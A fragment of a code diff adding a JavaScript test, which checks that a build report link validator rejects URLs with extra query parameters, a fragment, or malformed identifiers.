+});
+
+test("only the form itself is a build report's link: no other parameter, template or repo", () => {
+  for (const bad of [`${reportUrl("x")}&template=other.yml`, `${reportUrl("x")}&title=Spam&labels=bug`, `${reportUrl("x")}#x`, reportUrl("a/b"), reportUrl("")])
+    assert.ok(!isReportUrl(bad), bad);
 });
